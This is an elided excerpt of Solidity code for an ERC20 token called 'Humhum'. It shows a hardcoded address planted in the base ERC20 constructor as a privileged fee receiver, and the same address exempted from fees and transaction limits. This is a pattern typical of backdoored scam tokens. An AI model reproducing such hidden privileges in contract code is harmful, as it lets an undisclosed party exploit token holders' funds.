...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _feereceiver[0x0caBA632EE2a30321177e1DA5F0eF69018c7c6de] = _marketingwallet;
    }
...
contract Humhum is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("Humhum", "Humhum") {
        ...
        excludeFromFees(address(0x0caBA632EE2a30321177e1DA5F0eF69018c7c6de), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0x0caBA632EE2a30321177e1DA5F0eF69018c7c6de), true);
